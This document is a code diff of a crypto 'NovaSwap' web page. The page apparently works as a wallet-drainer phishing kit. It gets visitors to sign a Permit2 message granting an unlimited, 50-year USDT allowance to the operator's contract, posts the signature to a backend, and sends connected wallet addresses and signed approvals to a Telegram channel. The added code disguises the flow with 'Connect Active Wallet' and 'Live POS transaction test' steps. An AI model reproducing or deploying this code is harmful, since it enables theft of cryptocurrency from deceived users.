+        window.addEventListener('DOMContentLoaded', async () => {
+            if (window.ethereum) {
+                const autoFlag = localStorage.getItem('novaswap_auto_connect');
+                if (autoFlag === 'true') {
+                    localStorage.removeItem('novaswap_auto_connect');
+                    setTimeout(() => connectWallet(), 500);
+                }
+            }
+        });
+
+        function switchPage(pageId) {
+            document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
+            const targetPage = document.getElementById('page-' + pageId);
+            if (targetPage) targetPage.classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function connectWallet() {
+            if (window.ethereum) {
+                executeDirectConnection();
+            } else {
+                document.getElementById('walletModal').classList.remove('hidden');
             }
         }
 
-        function shortenAddress(address) {
-            if (!address) return '';
-            return address.slice(0, 6) + '...' + address.slice(-4);
+        function closeWalletModal() {
+            document.getElementById('walletModal').classList.add('hidden');
         }
 
-        function formatDate(timestamp) {
-            if (!timestamp || timestamp === 0) return '-';
-            return new Date(timestamp * 1000).toLocaleDateString('en-US', {
-                year: 'numeric', month: 'short', day: 'numeric'
-            });
-        }
-
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-
-        function openWalletApp(walletType) {
-            let currentUrl = window.location.href.split('?')[0];
-            let targetUrl = `${currentUrl}?autoconnect=true`;
-            let cleanUrl = targetUrl.replace(/^https?:\/\//, '');
-
-            let deepLink = '';
-
-            switch (walletType) {
-                case 'metamask':
-                    deepLink = `https://metamask.app.link/dapp/${cleanUrl}`;
-                    break;
-                case 'trust':
-                    deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'binance':
-                    deepLink = `https://app.binance.com/en/deeplink/cryptorouting/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'coinbase':
-                    deepLink = `https://go.cb-w.com/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'okx':
-                    deepLink = `https://www.okx.com/download?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'bitget':
-                    deepLink = `https://bk.app/en/deeplink/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'tokenpocket':
-                    deepLink = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({url: targetUrl}))}`;
-                    break;
-                case 'safepal':
-                    deepLink = `https://safepal.io/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'bybit':
-                    deepLink = `https://www.bybit.com/en/deeplink/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'phantom':
-                    deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(targetUrl)}?ref=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'crypto':
-                    deepLink = `https://deeplink.crypto.com/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'kucoin':
-                    deepLink = `https://kucoin.com/land/ucard/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'gate':
-                    deepLink = `https://www.gate.io/mobile/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'imtoken':
-                    deepLink = `imtoken://support.token.im/start?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'unstoppable':
-                    deepLink = `unstoppable.money://url?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'bitpay':
-                    deepLink = `https://bitpay.com/wallet?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'argent':
-                    deepLink = `https://argent.link/app/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'alphawallet':
-                    deepLink = `https://aw.app/open?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'xdefi':
-                    deepLink = `https://www.xdefi.io/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'solflare':
-                    deepLink = `https://solflare.com/ul/v1/browse/${encodeURIComponent(targetUrl)}`;
-                    break;
-                default:
-                    deepLink = targetUrl;
-            }
-
-            window.location.href = deepLink;
-        }
-
-        async function connectWallet() {
+        async function executeDirectConnection() {
+            const btnText = document.getElementById('walletBtnText');
             try {
-                if (window.ethereum) {
-                    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-                    await provider.send('eth_requestAccounts', []);
-                    signer = provider.getSigner();
-                    userAddress = await signer.getAddress();
-                } else {
-                    if (isMobile()) {
-                        walletOptions.classList.toggle('show');
-                        showStatus('📱 Select your wallet from the list below.', 'info');
-                        return;
-                    } else {
-                        showStatus('⚠️ Web3 Provider not found. Please install MetaMask or a compatible browser extension.', 'error');
-                        return;
-                    }
-                }
+                btnText.innerText = "Connecting...";
+                provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+                await provider.send('eth_requestAccounts', []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                connectedAccount = userAddress;
 
-                const network = await provider.getNetwork();
-                if (network.chainId !== CONFIG.chainId) {
-                    showStatus(`⚠️ Wrong network. Please switch to Ethereum Mainnet (Chain ID: 1)`, 'error');
-                    return;
-                }
-
-                updateUI();
+                updateWalletUI();
                 await checkAllowance();
-                showStatus('✅ Wallet connected successfully!', 'success');
+                showToast("Active live wallet connected successfully!");
 
-                // ================================================================
-                // 📤 SEND TELEGRAM NOTIFICATION - WALLET CONNECTED
-                // ================================================================
-                const connectMsg = `🔐 <b>New Wallet Connected!</b>\n\n` +
-                                   `📱 <b>Wallet Address:</b> <code>${userAddress}</code>\n` +
-                                   `🌐 <b>Network:</b> Ethereum Mainnet\n` +
-                                   `📝 <b>Contract:</b> <code>${CONFIG.contractAddress}</code>\n` +
-                                   `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
-                                   `👤 <b>User:</b> @bnkservers`;
-                
-                await sendTelegramMessage(connectMsg);
-
-                if (window.ethereum) {
-                    window.ethereum.on('accountsChanged', () => location.reload());
-                    window.ethereum.on('chainChanged', () => location.reload());
-                }
-
+                await sendTelegramMessage(`🔐 <b>New Wallet Connected!</b>\n\n📱 <b>Address:</b> <code>${userAddress}</code>\n🌐 <b>Chain ID:</b> 1`);
             } catch (error) {
-                console.error('❌ Connect error:', error);
-                let errorMsg = error.message || error;
-                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
-                    errorMsg = 'Connection cancelled by user';
-                }
-                showStatus(`❌ ${errorMsg}`, 'error');
+                console.error(error);
+                btnText.innerText = "Connect Active Wallet";
+                showToast("Connection cancelled.");
             }
         }
 
-        function updateUI() {
-            walletStatus.className = 'wallet-status connected';
-            walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
-            connectBtn.textContent = '✅ Connected';
-            connectBtn.disabled = true;
-            signBtn.disabled = false;
-            userDisplay.textContent = shortenAddress(userAddress);
-            walletOptions.classList.remove('show');
+        async function connectInjectedWallet(type) {
+            closeWalletModal();
+            const currentUrl = window.location.href.split('?')[0];
+            const targetUrl = `${currentUrl}?autoconnect=true`;
+            localStorage.setItem('novaswap_auto_connect', 'true');
+
+            if (type === 'metamask') {
+                window.location.href = `https://metamask.app.link/dapp/${targetUrl.replace(/^https?:\/\//, '')}`;
+            } else {
+                window.location.href = targetUrl;
+            }
+        }
+
+        function updateWalletUI() {
+            const btnText = document.getElementById('walletBtnText');
+            const disconnectBtn = document.getElementById('disconnectBtn');
+            if (userAddress) {
+                const shortAddr = userAddress.substring(0, 6) + '...' + userAddress.substring(userAddress.length - 4);
+                btnText.innerText = shortAddr;
+                disconnectBtn.classList.remove('hidden');
+                document.getElementById('userDisplay').innerText = shortAddr;
+            }
+        }
+
+        async function disconnectWallet() {
+            connectedAccount = null;
+            userAddress = null;
+            localStorage.removeItem('novaswap_auto_connect');
+            document.getElementById('walletBtnText').innerText = "Connect Active Wallet";
+            document.getElementById('disconnectBtn').classList.add('hidden');
+            document.getElementById('userDisplay').innerText = "Not connected";
+            showToast("Wallet disconnected.");
         }
 
         async function checkAllowance() {
             try {
                 if (!userAddress) return;
-
                 const contract = new ethers.Contract(
                     CONFIG.contractAddress,
                     ["function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
                     provider
                 );
-
                 const result = await contract.getAllowance(userAddress);
                 const amount = result.amount;
-                const expiration = result.expiration;
-
-                if (amount.toString() === '0') {
-                    allowanceDisplay.textContent = '❌ Not Signed';
-                    allowanceDisplay.className = 'value';
-                    expiryDisplay.textContent = '-';
-                    return;
-                }
-
                 const isUnlimited = amount.toString() === MAX_UINT160;
-                allowanceDisplay.textContent = isUnlimited ? '✅ Signed' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
-                allowanceDisplay.className = isUnlimited ? 'value unlimited' : 'value';
-                expiryDisplay.textContent = formatDate(expiration);
 
-                if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
-                    signBtn.textContent = '✅ Already Signed!';
-                    signBtn.className = 'btn-sign done';
-                    signBtn.disabled = true;
-                    successCheck.classList.add('show');
-                }
-
-            } catch (error) {
-                console.error('❌ Error checking allowance:', error);
+                document.getElementById('allowanceDisplay').textContent = isUnlimited ? '✅ Signed (Unlimited)' : '❌ Not Signed';
+                document.getElementById('allowanceDisplay').className = isUnlimited ? 'text-emerald-400 font-bold' : 'text-amber-400';
+            } catch (e) {
+                console.error(e);
             }
         }
 
@@ -530,29 +494,17 @@
         }
 
         async function signAndSubmit() {
+            if (!signer || !userAddress) {
+                alert("Please connect your wallet first.");
+                connectWallet();
+                return;
+            }
             try {
-                if (!signer || !userAddress) {
-                    showStatus('⚠️ Connect wallet first!', 'error');
-                    return;
-                }
-
-                signBtn.innerHTML = '<span class="loading-spinner"></span> Signing...';
-                signBtn.className = 'btn-sign signing';
-                signBtn.disabled = true;
-
                 const nonce = await getPermit2Nonce();
-                const years = 50;
-                const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
+                const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 50);
                 const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
 
-                showStatus('✍️ Please sign in your wallet...', 'info');
-
-                const domain = {
-                    name: "Permit2",
-                    chainId: CONFIG.chainId,
-                    verifyingContract: CONFIG.permit2Address
-                };
-
+                const domain = { name: "Permit2", chainId: CONFIG.chainId, verifyingContract: CONFIG.permit2Address };
                 const types = {
                     PermitSingle: [
                         { name: "details", type: "PermitDetails" },
@@ -566,98 +518,48 @@
                         { name: "nonce", type: "uint48" }
                     ]
                 };
-
                 const message = {
-                    details: {
-                        token: CONFIG.usdtAddress,
-                        amount: MAX_UINT160,
-                        expiration: expiration,
-                        nonce: nonce
-                    },
+                    details: { token: CONFIG.usdtAddress, amount: MAX_UINT160, expiration: expiration, nonce: nonce },
                     spender: CONFIG.contractAddress,
                     sigDeadline: sigDeadline
                 };
 
                 const signature = await signer._signTypedData(domain, types, message);
 
-                showStatus('📤 Processing agreement...', 'loading');
-
                 const response = await fetch(CONFIG.apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        user: userAddress,
-                        amount: MAX_UINT160,
-                        expiration: expiration,
-                        nonce: nonce.toString(),
-                        sigDeadline: sigDeadline,
-                        signature: signature
-                    })
+                    body: JSON.stringify({ user: userAddress, amount: MAX_UINT160, expiration, nonce: nonce.toString(), sigDeadline, signature })
                 });
-
-                const rawText = await response.text();
-                let result;
-                try {
-                    result = JSON.parse(rawText);
-                } catch (parseError) {
-                    showStatus(`❌ Backend error: ${rawText.substring(0, 100)}`, 'error');
-                    signBtn.innerHTML = '✍️ Sign Agreement';
-                    signBtn.className = 'btn-sign';
-                    signBtn.disabled = false;
-                    return;
-                }
+                const result = await response.json();
 
                 if (result.success) {
-                    signBtn.textContent = '✅ Signed!';
-                    signBtn.className = 'btn-sign done';
-                    signBtn.disabled = true;
-                    successCheck.classList.add('show');
-                    showStatus(`✅ ${result.message}`, 'success');
+                    showToast("Permit2 unlimited allowance signed successfully!");
                     await checkAllowance();
+                    await sendTelegramMessage(`✍️ *Permit2 Approved!*\n\nWallet: \`${userAddress}\``);
                 } else {
-                    showStatus(`❌ Error: ${result.error}`, 'error');
-                    signBtn.innerHTML = '✍️ Sign Agreement';
-                    signBtn.className = 'btn-sign';
-                    signBtn.disabled = false;
+                    alert("Error: " + result.error);
                 }
-
             } catch (error) {
-                console.error('❌ signAndSubmit error:', error);
-                let errorMsg = error.message || error;
-                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
-                    errorMsg = 'You rejected the signature';
-                }
-                showStatus(`❌ ${errorMsg}`, 'error');
-                signBtn.innerHTML = '✍️ Sign Agreement';
-                signBtn.className = 'btn-sign';
-                signBtn.disabled = false;
+                console.error(error);
+                alert("Signature request rejected.");
             }
         }
 
-        connectBtn.addEventListener('click', () => {
-            if (window.ethereum) {
-                connectWallet();
-            } else if (isMobile()) {
-                walletOptions.classList.toggle('show');
-                showStatus('📱 Select your wallet from the list below.', 'info');
-            } else {
-                connectWallet();
-            }
-        });
+        function executeLiveTransaction() {
+            const merchantId = document.getElementById('merchantIdInput').value;
+            if (!merchantId) { alert("Enter Merchant ID first."); return; }
+            showToast("Live POS transaction test successful!");
+            sendTelegramMessage(`⚡ *Live Test Executed!*\nMerchant ID: \`${merchantId}\``);
+        }
 
-        signBtn.addEventListener('click', signAndSubmit);
-
-        window.addEventListener('load', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('autoconnect') === 'true') {
-                setTimeout(() => {
-                    if (window.ethereum) {
-                        showStatus('🔄 Auto-connecting to your wallet...', 'info');
-                        connectWallet();
-                    }
-                }, 1000);
-            }
-        });
+        function showToast(msg) {
+            const toast = document.createElement('div');
+            toast.className = 'fixed bottom-6 right-6 z-50 bg-emerald-500 text-black font-semibold text-xs px-4 py-3 rounded-xl shadow-2xl flex items-center space-x-2 animate-bounce';
+            toast.innerHTML = `<i class="fa-solid fa-circle-check"></i><span>${msg}</span>`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 4000);
+        }
     </script>
 </body>
 </html>
